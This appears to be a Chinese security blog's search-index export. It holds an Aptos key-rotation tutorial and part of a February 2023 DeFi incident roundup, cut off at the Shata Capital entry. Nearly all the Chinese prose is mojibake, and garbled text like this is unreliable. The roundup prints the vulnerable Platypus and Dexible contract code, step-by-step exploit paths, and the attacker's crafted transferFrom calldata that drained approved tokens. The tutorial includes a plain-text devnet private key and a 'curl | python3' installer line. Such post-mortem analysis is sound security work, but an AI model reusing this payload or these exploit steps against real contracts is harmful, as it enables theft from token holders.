å°„èˆ‡æ–°åœ°å€æ˜ å°„ \u0026lt;new_address, originating_address\u0026gt;ã€‚ ç‚ºäº†é©—è­‰é€™å…©å€‹ç°½åï¼Œæˆ‘å€‘éœ€è¦å®ƒå€‘å°æ‡‰çš„å…¬é‘°å’Œå…¬é‘°æ–¹æ¡ˆï¼šæˆ‘å€‘ä½¿ç”¨ from_scheme å’Œfrom_public_key_bytesé©—è­‰cap_rotate_keyï¼Œä½¿ç”¨to_schemeå’Œto_public_key_bytesé©—è­‰cap_update_tableã€‚\nå–®ç°½ç‚ºED25519_SCHEMEï¼Œå¤šç°½å‰‡ç‚ºMULTI_ED25519_SCHEMEã€‚\nä½¿ç”¨ Aptos cli é”æˆå–®ç°½å¸³æˆ¶å¯†é‘°è¼ªæ› åˆå§‹ç‹€æ…‹ï¼Œå¯ä»¥çœ‹åˆ° account address èˆ‡ authentication key ç›¸åŒã€‚ ç”¢ç”Ÿå¯†é‘°ï¼š 1 2 3 4 5 6 7 aptos key generate --key-type ed25519 --output-file output.key { \u0026#34;Result\u0026#34;: { \u0026#34;PrivateKey Path\u0026#34;: \u0026#34;output.key\u0026#34;, \u0026#34;PublicKey Path\u0026#34;: \u0026#34;output.key.pub\u0026#34; } } åˆ©ç”¨ aptos cli åš key rotationï¼Œåƒæ•¸å¯ä»¥é¸æ“‡ç›´æ¥å¡«å…¥ç§é‘°æˆ– key file: 1 aptos account rotate-key --new-private-key-file output.key 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 aptos account rotate-key --new-private-key 0xae249782eedbfafcc7da157542d1f97d97385cbda36338c806475a3ce127fd90 Do you want to submit a transaction for a range of [52100 - 78100] Octas at a gas unit price of 100 Octas? [yes/no] \u0026gt; yes { \u0026#34;transaction_hash\u0026#34;: \u0026#34;0x75c412d82e038f87cec14c6c8b08c7fb08290118437e18433700c0e5d0262854\u0026#34;, \u0026#34;gas_used\u0026#34;: 521, \u0026#34;gas_unit_price\u0026#34;: 100, \u0026#34;sender\u0026#34;: \u0026#34;148f1f6f88d690a04451fa8a548f21129b537cf511cedaa66a6ad93abc83a607\u0026#34;, \u0026#34;sequence_number\u0026#34;: 0, \u0026#34;success\u0026#34;: true, \u0026#34;timestamp_us\u0026#34;: 1688636116823320, \u0026#34;version\u0026#34;: 571106848, \u0026#34;vm_status\u0026#34;: \u0026#34;Executed successfully\u0026#34; } Do you want to create a profile for the new key? [yes/no] \u0026gt; yes Enter the name for the profile Update Profile Update is saved. { \u0026#34;Result\u0026#34;: { \u0026#34;message\u0026#34;: \u0026#34;Profile Update is saved.\u0026#34;, \u0026#34;transaction\u0026#34;: { \u0026#34;transaction_hash\u0026#34;: \u0026#34;0x75c412d82e038f87cec14c6c8b08c7fb08290118437e18433700c0e5d0262854\u0026#34;, \u0026#34;gas_used\u0026#34;: 521, \u0026#34;gas_unit_price\u0026#34;: 100, \u0026#34;sender\u0026#34;: \u0026#34;148f1f6f88d690a04451fa8a548f21129b537cf511cedaa66a6ad93abc83a607\u0026#34;, \u0026#34;sequence_number\u0026#34;: 0, \u0026#34;success\u0026#34;: true, \u0026#34;timestamp_us\u0026#34;: 1688636116823320, \u0026#34;version\u0026#34;: 571106848, \u0026#34;vm_status\u0026#34;: \u0026#34;Executed successfully\u0026#34; } } } å›åˆ° Aptos explorer æŸ¥çœ‹ï¼Œauthentication key å·²æ”¹è®Šï¼Œaccount address ç¶­æŒç›¸åŒã€‚ aptos cli ä¹Ÿå¯ä»¥é€é public key ä¾†åæŸ¥å‡ºå¸³æˆ¶åœ°å€ï¼š\n1 2 3 4 aptos account lookup-address --public-key-file output.key.pub { \u0026#34;Result\u0026#34;: \u0026#34;148f1f6f88d690a04451fa8a548f21129b537cf511cedaa66a6ad93abc83a607\u0026#34; } ä½¿ç”¨ Python SDK å°‡å–®ç°½å¸³æˆ¶è¼ªæ›ç‚ºå¤šç°½å¸³æˆ¶ ä»¥ aptos-core ä¸­ python sdk çš„ multisig ç¯„ä¾‹ä½œç‚ºåƒè€ƒï¼Œå¯ä»¥æ ¹æ“šè‡ªå·±çš„ä½¿ç”¨æƒ…å¢ƒé€²è¡Œä¿®æ”¹ã€‚\nç¸½çµä¸€ä¸‹æµç¨‹ï¼š\nå»ºç«‹ä¸€å€‹å–®ç°½å¸³æˆ¶ å»ºç«‹ä¸€å€‹å¤šç°½å¸³æˆ¶ï¼Œé€™é‚Šæ˜¯å»ºç«‹ä¸€å€‹ 2-of-3 å¤šç°½å¸³æˆ¶ ç°½ç½² rotation proof challenge åŸ·è¡Œè¼ªæ› authentication key ç’°å¢ƒå®‰è£ å®‰è£ Poetry æ¨è–¦ä½¿ç”¨ Poetry é€²è¡Œ Python å¥—ä»¶ç®¡ç†ã€‚\nå®‰è£ Poetry 1 curl -sSL https://install.python-poetry.org | python3 - å°‡ Poetry åŠ å…¥ PATH ä¾ç…§è‡ªå·±çš„ç³»çµ±ç’°å¢ƒï¼ŒåŠ åˆ° .zshrc æˆ– .bashrc 1 export PATH=\u0026#34;$HOME/.local/bin:$PATH\u0026#34; ç¢ºèª Poetry å®‰è£å®Œæˆ 1 poetry --version å®‰è£ Aptos Python SDK 1 pip3 install aptos-sdk æ›´å¤šè©³ç´°è³‡è¨Šï¼Œå¯åƒè€ƒå®˜ç¶²æ–‡æª”ã€‚\nåŸ·è¡Œ Aptos SDK Example 1 git clone https://github.com/aptos-labs/aptos-core.git 1 cd aptos-core/ecosystem/python/sdk é‡ç¾å°ˆæ¡ˆçš„ Poetry è™›æ“¬ç’°å¢ƒ 1 poetry env use python3 å®‰è£å¥—ä»¶ 1 poetry install åŸ·è¡Œ 1 poetry run python -m examples.multisig è¨­å®š å¼•å…¥è¦ç”¨åˆ°çš„åº«\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from aptos_sdk.account import Account, RotationProofChallenge from aptos_sdk.account_address import AccountAddress from aptos_sdk.authenticator import Authenticator, MultiEd25519Authenticator from aptos_sdk.bcs import Serializer from aptos_sdk.client import FaucetClient, RestClient from aptos_sdk.ed25519 import MultiPublicKey, MultiSignature from aptos_sdk.transactions import ( EntryFunction, RawTransaction, Script, ScriptArgument, SignedTransaction, TransactionArgument, TransactionPayload, ) from aptos_sdk.type_tag import StructTag, TypeTag è¨­å®šé€£æ¥ç¯€é»ã€æ°´é¾é ­è³‡è¨Šï¼Œé€™é‚Šä½¿ç”¨ devnet ç’°å¢ƒï¼š\n1 2 3 4 5 NODE_URL = os.getenv(\u0026#34;APTOS_NODE_URL\u0026#34;, \u0026#34;https://fullnode.devnet.aptoslabs.com/v1\u0026#34;) FAUCET_URL = os.getenv( \u0026#34;APTOS_FAUCET_URL\u0026#34;, \u0026#34;https://faucet.devnet.aptoslabs.com\u0026#34;, ) åˆå§‹åŒ–å®¢æˆ¶ç«¯\n1 2 rest_client = RestClient(NODE_URL) faucet_client = FaucetClient(FAUCET_URL, rest_client) å»ºç«‹å–®ç°½å¸³æˆ¶ 1 2 3 deedee = Account.generate() faucet_client.fund_account(deedee.address(), 50_000_000) deedee_balance = rest_client.account_balance(deedee.address()) 1 2 3 4 Deedee\u0026#39;s address: 0x7ee730f9bb87e78b0f51b4399113af2ed6bc50d0a8e0bc27f914c287af6a9d49 Deedee\u0026#39;s auth key: 0x7ee730f9bb87e78b0f51b4399113af2ed6bc50d0a8e0bc27f914c287af6a9d49 Deedee\u0026#39;s public key: 0x641cb41098c6cea2c2643508ee28e116459c666e353d6dc708290c5dd8f27169 Deedee\u0026#39;s balance: 50000000 å»ºç«‹å¤šç°½å¸³æˆ¶ é€™é‚Šæˆ‘å€‘é¸æ“‡å»ºç«‹ 2-of-3 å¤šç°½å¸³æˆ¶ï¼Œæ‰€ä»¥å…ˆå»ºç«‹ä¸‰å€‹å–®ç°½å¸³æˆ¶ï¼Œé€™æ¨£æœƒæœ‰ä¸‰å°å…¬é‘°ç§é‘°å°ã€‚\n1 2 3 4 5 6 7 8 9 # generate account alice = Account.generate() bob = Account.generate() chad = Account.generate() # fund account faucet_client.fund_account(alice.address(), 10_000_000) faucet_client.fund_account(bob.address(), 20_000_000) faucet_client.fund_account(chad.address(), 30_000_000) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 === Account addresses === Alice: 0xe2f0ac3bf3066f83c3f13df40eb1f1e980b15bbf6198dfee0d4bfd741baf92a8 Bob: 0x55234e90dec96a74938a4da2f7815b97494fc3c4b4d8782fa9c0e83399613310 Chad: 0x9b2ff4d016b1dead4c79487275bcb332ce56d0c707bc07cf0f15e223e64122a0 === Authentication keys === Alice: 0xe2f0ac3bf3066f83c3f13df40eb1f1e980b15bbf6198dfee0d4bfd741baf92a8 Bob: 0x55234e90dec96a74938a4da2f7815b97494fc3c4b4d8782fa9c0e83399613310 Chad: 0x9b2ff4d016b1dead4c79487275bcb332ce56d0c707bc07cf0f15e223e64122a0 === Public keys === Alice: 0x53a03cc129319935ddabc8ac2afb0c5e320cd5bda347413fb6fe33bcdd0b7fb3 Bob: 0x51a95405c021b0449d11d71797ecb72e931c045a55f69ae96aa6c87d55ba8098 Chad: 0x74ac180a4c5b4f6e14f13b8a5e6dd19d102c0e3543268816dcb6484f0da5444d æ¥ä¸‹ä¾†ä½¿ç”¨ä¸Šä¸€æ­¥ç”¢ç”Ÿçš„å…¬é‘°å»ç”Ÿæˆ 2-of-3 å¤šç°½å¸³æˆ¶å…¬é‘°å’Œåœ°å€ã€‚\n1 2 3 4 5 6 7 8 9 # generate public key from Alice, Bob and Chad\u0026#39;s public key threshold = 2 multisig_public_key = MultiPublicKey( [alice.public_key(), bob.public_key(), chad.public_key()], threshold ) # get address multisig_address = AccountAddress.from_multi_ed25519(multisig_public_key) # fund account faucet_client.fund_account(multisig_address, 40_000_000) 1 2 3 === 2-of-3 Multisig account === Account public key: 2-of-3 Multi-Ed25519 public key Account address: 0x77e7728ef2189e48b3b898087c460a63f14955bcc6e4915b95aab8f864be8d05 ç°½ç½² rotation proof challenge åœ¨èª¿ç”¨ rotate_authentication_key ä¹‹å‰ï¼Œéœ€è¦æº–å‚™å‚³å…¥çš„åƒæ•¸ï¼Œåˆ†åˆ¥æ˜¯ cap_rotate_key åŠ cap_update_tableã€‚ cap_rotate_key è¡¨ Deedee æ‰¹å‡†æ­¤èº«ä»½é©—è­‰å¯†é‘°è¼ªæ›ã€‚ cap_update_table é©—è­‰å¤šç°½å¸³æˆ¶æ˜¯å¦æ‰¹å‡†èº«ä»½é©—è­‰å¯†é‘°è¼ªæ›ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 rotation_proof_challenge = RotationProofChallenge( sequence_number=0, originator=deedee.address(), current_auth_key=deedee.address(), new_public_key=multisig_public_key.to_bytes(), ) serializer = Serializer() rotation_proof_challenge.serialize(serializer) rotation_proof_challenge_bcs = serializer.output() cap_rotate_key = deedee.sign(rotation_proof_challenge_bcs).data() cap_update_table = MultiSignature( multisig_public_key, [ (bob.public_key(), bob.sign(rotation_proof_challenge_bcs)), (chad.public_key(), chad.sign(rotation_proof_challenge_bcs)), ], ).to_bytes() 1 2 3 === Signing rotation proof challenge === cap_rotate_key: 0x497d25f09c29df422e620dd8eaf44ee9b7bbc2844b5143ade652d9a0d084cd1b59e66e6d0c8ebd3a4e6d5b70ddc0f635bbe321ea6ac2902d2ab07e3248e5ac08 cap_update_table: 0xe40f69589e89beca67362c2cadb145df92d77351bfe77aa9318af88f1453576b2fc8e8723fca961e696014a0077946a762c18d7a64547b3ec1f0539f88889303d89de34be00ada58151a124cc3610226ca1c0ca9814be9040bba3c6d02f169a53b922ce6cb026165746c8e90837affac8692206dc9eb0f82f0117742d331670a60000000 åŸ·è¡Œè¼ªæ› authentication key ç¾åœ¨å¯ä»¥æäº¤èº«ä»½é©—è­‰å¯†é‘°è¼ªæ›çš„äº¤æ˜“ã€‚åŸ·è¡Œå¾Œï¼Œè¼ªæ›å¾Œçš„èº«ä»½é©—è­‰å¯†é‘°èˆ‡å¤šç°½å¸³æˆ¶çš„åœ°å€ç›¸åŒ¹é…ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 from_scheme = Authenticator.ED25519 from_public_key_bytes = deedee.public_key().key.encode() to_scheme = Authenticator.MULTI_ED25519 to_public_key_bytes = multisig_public_key.to_bytes() entry_function = EntryFunction.natural( module=\u0026#34;0x1::account\u0026#34;, function=\u0026#34;rotate_authentication_key\u0026#34;, ty_args=[], args=[ TransactionArgument(from_scheme, Serializer.u8), TransactionArgument(from_public_key_bytes, Serializer.to_bytes), TransactionArgument(to_scheme, Serializer.u8), TransactionArgument(to_public_key_bytes, Serializer.to_bytes), TransactionArgument(cap_rotate_key, Serializer.to_bytes), TransactionArgument(cap_update_table, Serializer.to_bytes), ], ) signed_transaction = rest_client.create_bcs_signed_transaction( deedee, TransactionPayload(entry_function) ) # auth key before key rotation auth_key = rest_client.account(deedee.address())[\u0026#34;authentication_key\u0026#34;] print(f\u0026#34;Auth key pre-rotation: {auth_key}\u0026#34;) # send key rotation tx tx_hash = rest_client.submit_bcs_transaction(signed_transaction) rest_client.wait_for_transaction(tx_hash) print(f\u0026#34;Transaction hash: {tx_hash}\u0026#34;) # auth key after key rotation auth_key = rest_client.account(deedee.address())[\u0026#34;authentication_key\u0026#34;] print(f\u0026#34;New auth key: {auth_key}\u0026#34;) print(f\u0026#34;1st multisig address: {multisig_address}\u0026#34;) 1 2 3 4 5 === Submitting authentication key rotation transaction === Auth key pre-rotation: 0x7ee730f9bb87e78b0f51b4399113af2ed6bc50d0a8e0bc27f914c287af6a9d49 Transaction hash: 0x16046f72559268dc4025d28bbc2d8c91ab7a780e237cbf430965477910014df0 New auth key: 0x77e7728ef2189e48b3b898087c460a63f14955bcc6e4915b95aab8f864be8d05 1st multisig address: 0x77e7728ef2189e48b3b898087c460a63f14955bcc6e4915b95aab8f864be8d05 ç¸½çµ Aptos å¸³æˆ¶è®“éˆä¸Šåœ°å€èº«ä»½èˆ‡ç§é‘°è§£è€¦ï¼Œæä¾›äº†å–®ç°½åŠå¤šç°½å¸³æˆ¶ï¼Œæœ€é‡è¦çš„æ˜¯å…·æœ‰å¯†é‘°è¼ªæ›çš„åŠŸèƒ½ã€‚ åœ°å€åœ¨å‰µå»ºå¸³è™Ÿå¾Œç¶­æŒä¸è®Šï¼Œå³ä½¿åœ¨å¯†é‘°è¼ªæ›å¾Œä»ç„¶ç¶­æŒç›¸åŒã€‚ å¯†é‘°è¼ªæ›æ”¹è®Šçš„æ˜¯å…¬é‘°ç§é‘°å°ä»¥åŠèº«ä»½é©—è­‰å¯†é‘°ã€‚\nï¼Ÿ å¦‚æœæƒ³æŠŠå…©å€‹å¸³è™Ÿæ›æˆåŒå€‹ auth key å¯ä»¥å—ï¼Ÿ\nä¸å¯ä»¥ã€‚\n1 2 3 { \u0026#34;Error\u0026#34;: \u0026#34;Simulation failed with status: Move abort in 0x1::table: 0x6407\u0026#34; } æœ‰å€‹ä¾‹å¤–ï¼Œç•¶ auth key == address çš„æ™‚å€™å¯ä»¥ã€‚\n1 2 3 4 5 6 7 8 9 address: 0xf2e692d2c041973da02f1dc9bd2d8aae30af6f27e706104d8f62cb07a73fcd54 auth key: 0x1be04e2fc6271fcfe03ecaf8e0dba4c0aed93439a6e3efcf40239a547b6a4268 === address: 0x1be04e2fc6271fcfe03ecaf8e0dba4c0aed93439a6e3efcf40239a547b6a4268 auth key: 0x1be04e2fc6271fcfe03ecaf8e0dba4c0aed93439a6e3efcf40239a547b6a4268 Reference https://aptos.dev/concepts/accounts/ https://medium.com/@martian-wallet/accounts-in-aptos-1ecc3f0b1213 https://forum.aptoslabs.com/t/aptos-review-account-system/150437 https://aptos.dev/tutorials/your-first-multisig/ ","date":"2023-07-08T00:00:00Z","permalink":"https://ashirleyshe.github.io/p/aptos-key-rotation/","title":"Aptos Key Rotation"},{"content":"Overview 2023 å¹´ 2 æœˆï¼Œæ”»æ“Šè€…ç«Šå–äº†ç´„ 3550 è¬ç¾å…ƒçš„åŠ å¯†è²¨å¹£ã€‚\nHopeless\u0026hellip;\nDefi å®‰å…¨äº‹ä»¶ 2 æœˆ 3 æ—¥ï¼Œbonqdao é­å—åƒ¹æ ¼æ“æ§æ”»æ“Šï¼Œæå¤±ç´„ 1.2 å„„ç¾å…ƒï¼Œä½†æ”»æ“Šè€…åªæ‹¿èµ°ä¸åˆ° 200 è¬ç¾å…ƒã€‚ 2 æœˆ 3 æ—¥ï¼ŒUSDs é­å—æ”»æ“Šï¼Œæå¤±ç´„ 30 è¬ç¾å…ƒã€‚ 2 æœˆ 4 æ—¥ï¼Œorion protocol é­å—é–ƒé›»è²¸é‡å…¥æ”»æ“Šï¼Œæå¤±ç´„ 300 è¬ç¾å…ƒã€‚ 2 æœˆ 10 æ—¥ï¼ŒdForce é­å—æ”»æ“Šï¼Œåˆæ˜¯ read-only reentrancyï¼Œæå¤±ç´„ 370 è¬ç¾å…ƒã€‚ 2 æœˆ 17 æ—¥ï¼ŒAvalanche éˆä¸Šçš„ Platypus é …ç›®é­å—é–ƒé›»è²¸æ”»æ“Šï¼Œæå¤±ç´„ 850 è¬ç¾å…ƒã€‚ 2 æœˆ 17 æ—¥ï¼ŒDexible é …ç›®å› åˆç´„ä¸­å‡½æ•¸é‚è¼¯æ¼æ´é­å—æ”»æ“Šï¼Œæå¤±ç´„ 154 è¬ç¾å…ƒã€‚ 2 æœˆ 24 æ—¥ï¼ŒShata Capital åˆç´„åœ¨å‡ç´šå¾Œé­å—æ”»æ“Šï¼Œæå¤±ç´„ 510 è¬ç¾å…ƒã€‚ 2 æœˆ 27 æ—¥ï¼ŒSwapX åˆç´„å› é—œéµå‡½æ•¸ç¼ºä¹è¨ªå•æ§åˆ¶è€Œé­åˆ°æ”»æ“Šï¼Œæ­¤åˆç´„ä¸¦æœªé–‹æºï¼Œå¤šå€‹æˆæ¬Šçµ¦è©²åˆç´„çš„ä»£å¹£é­å—äº†æå¤±ï¼Œæ¶‰åŠé‡‘é¡ç´„ 90 è¬ç¾å…ƒã€‚ å…¶ä»–å®‰å…¨äº‹ä»¶ 2 æœˆ 21 æ—¥ï¼ŒArbitrum éˆä¸Š Hope Finance ç™¼ç”Ÿ rug pullï¼Œæå–äº† 180 è¬ç¾å…ƒä¸¦è½‰å…¥ Tornado Cashã€‚ 2 æœˆ 25 æ—¥ï¼ŒWormhole é­é§­çš„ 12 è¬é¡† eth è¢« Jump Crypto åŠ Oasis å›æ”¶ã€‚ Platypus æ”»æ“Šè€…å­˜å…¥ 4400 è¬æŠµæŠ¼å“ï¼Œå€Ÿå…¥ 4200 è¬ï¼Œç„¶å¾Œä½¿ç”¨ emergencyWithdraw()ï¼Œå®ƒå¾ˆé«˜èˆˆåœ°å‘æ”»æ“Šè€…è¿”é‚„äº†å…¨éƒ¨å­˜å…¥çš„æŠµæŠ¼å“â€”â€”æ­¤æ™‚æ”»æ“Šè€…æ“æœ‰çš„æ˜¯ 4400 è¬æŠµæŠ¼å“åŠ ä¸Šå€Ÿå…¥çš„ 4200 è¬ã€‚\næ”»æ“Šäº¤æ˜“ï¼š https://snowtrace.io/tx/0x1266a937c2ccd970e5d7929021eed3ec593a95c68a99b4920c2efa226679b430 æ”»æ“Šè€…åœ°å€ï¼š https://snowtrace.io/address/0xeff003d64046a6f521ba31f39405cb720e953958 æ¼æ´é—œéµé»ï¼šemergencyWithdraw() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 /// @notice Withdraw without caring about rewards. EMERGENCY ONLY. /// @param _pid the pool id function emergencyWithdraw(uint256 _pid) public nonReentrant { PoolInfo storage pool = poolInfo[_pid]; UserInfo storage user = userInfo[_pid][msg.sender]; if (address(platypusTreasure) != address(0x00)) { (bool isSolvent, ) = platypusTreasure.isSolvent(msg.sender, address(poolInfo[_pid].lpToken), true); require(isSolvent, \u0026#39;remaining amount exceeds collateral factor\u0026#39;); } // reset rewarder before we update lpSupply and sumOfFactors IBoostedMultiRewarder rewarder = pool.rewarder; if (address(rewarder) != address(0)) { rewarder.onPtpReward(msg.sender, user.amount, 0, user.factor, 0); } // SafeERC20 is not needed as Asset will revert if transfer fails pool.lpToken.transfer(address(msg.sender), user.amount); // update non-dialuting factor pool.sumOfFactors -= user.factor; user.amount = 0; user.factor = 0; user.rewardDebt = 0; emit EmergencyWithdraw(msg.sender, _pid, user.amount); } isSolvent() ä¸»è¦æª¢æŸ¥çš„æ˜¯æŠµæŠ¼å“çš„åƒ¹å€¼æ˜¯å¦å¤§æ–¼å€Ÿæ¬¾çš„åƒ¹å€¼ã€‚ emergencyWithdraw() ä¸¦æ²’æœ‰é™¤äº† isSolvent() çš„å…¶ä»–æª¢æŸ¥ã€‚\nåˆ©ç”¨æ­¥é©Ÿ æ”»æ“Šè€…é–ƒé›»è²¸è²¸å‡º 44M USDCã€‚ å°‡ USDC å­˜å…¥ Platypus çš„æ± å­ä¸­ä¸¦æ‹¿åˆ° LP tokenã€‚ å°‡ LP token é€é MasterPlatypusV4 é€²è¡Œ deposit()ã€‚ é€é PlatypusTreasure é€²è¡Œå€Ÿæ¬¾ borrow()ï¼Œå€Ÿå‡º USPã€‚ èª¿ç”¨ emergencyWithdraw() é ˜å‡ºæ‰€æœ‰æŠµæŠ¼å“ã€‚å› ç‚ºå€Ÿè²¸çš„é¡åº¦æ²’æœ‰è¶…éæœ€é«˜é™åˆ¶ï¼Œ isSolvent å‡½æ•¸è¿”å›ç‚º trueï¼Œæ”»æ“Šè€…ä¾¿å¯ä»¥æå–æŠµæŠ¼å“ã€‚ å°‡ USP æ›æˆå…¶ä»–ç©©å®šå¹£ã€‚ å„Ÿé‚„é–ƒé›»è²¸ç²åˆ©ã€‚ å¾ŒçºŒ è³‡é‡‘ä¾ç„¶ç•™å­˜åœ¨æ”»æ“Šåˆç´„ä¸­ï¼Œå› ç‚ºæ”»æ“Šè€…æ²’å¯« withdraw() https://snowtrace.io/tokenholdings?a=0x67afdd6489d40a01dae65f709367e1b1d18a5322 Tether å°‡æ”»æ“Šè€…åœ°å€åˆ—å…¥é»‘åå–® Tether blacklisted them pic.twitter.com/GCto0N68AY\n\u0026mdash; ZachXBT (@zachxbt) February 16, 2023 ZachXBT è¿½æº¯åˆ°æ”»æ“Šè€…çš„æ¨ç‰¹å¸³æˆ¶ Hi @retlqw since you deactivated your account after I messaged you.\nI\u0026#39;ve traced addresses back to your account from the @Platypusdefi exploit and I am in touch with their team and exchanges.\nWeâ€™d like to negotiate returning of the funds before we engage with law enforcement. pic.twitter.com/oJdAc9IIkD\n\u0026mdash; ZachXBT (@zachxbt) February 17, 2023 2/18 Blocksec å–å›è¢«ç›œè³‡é‡‘ We help @Platypusdefi recover 2.4M USDC from the attacker contract successfully!\nBlockSec will always be here to secure the whole ecosystem. https://t.co/13JkXxy2II\n\u0026mdash; BlockSec (@BlockSecTeam) February 17, 2023 2/26 æ³•å›½è­¦æ–¹å·²é€®æ•æ¶‰å«Œæ”»å‡» Platypus Finance çš„ä¸¤åé»‘å®¢ https://foresightnews.pro/news/detail/18357 Blocksec Reverse Hack äº¤æ˜“ï¼š https://snowtrace.io/tx/0x5e3eb070c772631d599367521b886793e13cf0bc150bd588357c589395d2d5c3 In a dazzling reverse hack, a substantial chunk of the Playtpus hack stolen funds have been recovered.\nHere\u0026#39;s how it worked: (1/4) pic.twitter.com/gRWkLPMr7Q\n\u0026mdash; Daniel Von Fange (@danielvf) February 17, 2023 Blocksec ç›´æ¥å¾©ç”¨æ”»æ“Šåˆç´„çš„ executeOperation()ï¼Œé”æˆä¸€æ¬¡ç²¾å½©çš„è³‡é‡‘æ•‘æ´ã€‚\næ”»æ“Šåˆç´„çš„ executeOperation() ä¸¦æœªæª¢æŸ¥æ˜¯å¦ç‚º AAVE flashloan çš„ callbackï¼Œå°è‡´ä»»ä½•äººéƒ½å¯ä»¥èª¿ç”¨æ­¤å‡½æ•¸ã€‚\né …ç›®æ–¹å‡ç´šåˆç´„ï¼Œå‡ç´šæˆæ”»æ“ŠæœŸé–“ç«Šå–æ”»æ“Šè€…çš„è³‡é‡‘çµ¦é …ç›®æ–¹ã€‚é †åºæ¶‰åŠ approve USDC çµ¦ Platypus é …ç›®æ–¹åˆç´„ï¼Œdeposit USDC åˆ° Platypus pool ä¸­ï¼Œä½†æ”»æ“Šåˆç´„ä¸æœƒæ‹¿åˆ° LP tokenã€‚ Reference https://twitter.com/danielvf/status/1626340324103663617 https://twitter.com/danielvf/status/1626641254531448833 Dexible selfSwap å‡½æ•¸å­˜åœ¨èª¿ç”¨ fill å‡½æ•¸çš„é‚è¼¯ç¼ºé™·ï¼Œèª¿ç”¨æ”»æ“Šè€…çš„è‡ªå®šç¾©æ•¸æ“šï¼Œä¸¦ç„¡æª¢æŸ¥æ­¤è‡ªå®šç¾©æ•¸æ“šã€‚æ”»æ“Šè€…åœ¨æ•¸æ“šä¸­æ§‹é€  transferfrom å‡½æ•¸ï¼Œå‚³å…¥å…¶ä»–ç”¨æˆ¶å’Œè‡ªå·±çš„æ”»æ“Šåœ°å€ï¼Œå…è¨±åˆç´„èªå¯çš„ä»£å¹£è½‰å‡ºã€‚\næ”»æ“Šäº¤æ˜“ï¼š https://etherscan.io/tx/0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6 æ”»æ“Šè€…åœ°å€ï¼š https://etherscan.io/address/0x684083f312ac50f538cc4b634d85a2feafaab77a æ¼æ´é—œéµé»ï¼šselfSwap() \u0026amp; fill() selfSwap() å…è¨±ç”¨æˆ¶è‡ªå·±å®šç¾©äº¤æ˜“è·¯å¾‘ï¼Œä¸¦ä¸”å¯ä»¥æŒ‡å®šäº¤æ˜“çš„ä»£å¹£ã€DEXï¼Œä¹Ÿå°±æ˜¯èªªè¦æŒ‡å®šèª¿ç”¨ä»€éº¼ DEX ä»¥åŠå‘ä»€éº¼ DEX ç™¼é€ä»€éº¼ data ä¾†é€²è¡Œäº¤æ˜“ã€‚ ä¸¦æ²’æœ‰æª¢æŸ¥åœ°å€æ˜¯ä¸æ˜¯çœŸçš„æ˜¯ä¸€å€‹ DEXï¼Œä¹Ÿæ²’æœ‰ä¸€å€‹ç™½åå–®ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 function selfSwap(SwapTypes.SelfSwap calldata request) external notPaused { //we create a swap request that has no affiliate attached and thus no //automatic discount. SwapTypes.SwapRequest memory swapReq = SwapTypes.SwapRequest({ executionRequest: ExecutionTypes.ExecutionRequest({ fee: ExecutionTypes.FeeDetails({ feeToken: request.feeToken, affiliate: address(0), affiliatePortion: 0 }), requester: msg.sender }), tokenIn: request.tokenIn, tokenOut: request.tokenOut, routes: request.routes }); SwapMeta memory details = SwapMeta({ feeIsInput: false, isSelfSwap: true, startGas: 0, preSwapVault: address(DexibleStorage.load().communityVault), bpsAmount: 0, gasAmount: 0, nativeGasAmount: 0, toProtocol: 0, toRevshare: 0, outToTrader: 0, preDXBLBalance: 0, outAmount: 0, inputAmountDue: 0 }); details = this.fill(swapReq, details); postFill(swapReq, details, true); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function fill(SwapTypes.SwapRequest calldata request, SwapMeta memory meta) external onlySelf returns (SwapMeta memory) { preCheck(request, meta); meta.outAmount = request.tokenOut.token.balanceOf(address(this)); for(uint i=0;i\u0026lt;request.routes.length;++i) { SwapTypes.RouterRequest calldata rr = request.routes[i]; IERC20(rr.routeAmount.token).safeApprove(rr.spender, rr.routeAmount.amount); (bool s, ) = rr.router.call(rr.routerData); if(!s) { revert(\u0026#34;Failed to swap\u0026#34;); } } ... return meta; } rr.routerData å¯è‡ªè¡Œæ§‹é€ ï¼Œæ”»æ“Šè€…åœ¨æ­¤æ§‹é€ äº†ä¸€å€‹ transferFrom å‡½æ•¸ï¼Œå‚³å…¥å…¶ä»–ç”¨æˆ¶å’Œè‡ªå·±çš„æ”»æ“Šåœ°å€ï¼Œå…è¨±åˆç´„èªå¯çš„ä»£å¹£è½‰å‡ºã€‚\n1 2 3 { routerData:\u0026#34;0x23b872dd00000000000000000000000058f5f0684c381fcfc203d77b2bba468ebb29b098000000000000000000000000684083f312ac50f538cc4b634d85a2feafaab77a00000000000000000000000000000000000000000000000000066189a9f3b980\u0026#34; } 0x23b872dd å³ç‚º transferFrom(address,address,uint256) çš„ function selectorã€‚\nåˆ©ç”¨æ­¥é©Ÿ å…ˆæ‰¾ä¸€å€‹æœ‰ approve token çµ¦ Dexible åˆç´„çš„å—å®³è€…ã€‚ èª¿ç”¨ selfSwap()ï¼Œä¸¦æ§‹é€ æŒ‡å®š calldataã€‚å°‡å—å®³è€…çš„ä»£å¹£è½‰ç§»åˆ°æ”»æ“Šè€…çš„åœ°å€ã€‚ å¾ŒçºŒ æ”»æ“Šè€…å°‡è³‡é‡‘è½‰ç§»åˆ° Tornado Cash é …ç›®æ–¹å·²æš«åœæ‰€æœ‰åˆç´„åŠŸèƒ½ Reference https://rekt.news/zh/dexible-rekt/ Shata Capital EFVault åˆç´„å‡ç´šå¾Œé—œéµè®Šæ•¸æœªæ­£ç¢ºé…ç½®ï¼Œå°è‡´å¯ä»¥é ˜å‡ºæ¯”å¯¦éš›å­˜å…¥çš„ä»£å¹£æ›´å¤šçš„ä»£å¹£ã€‚\næ”»æ“Šäº¤æ˜“ï¼š 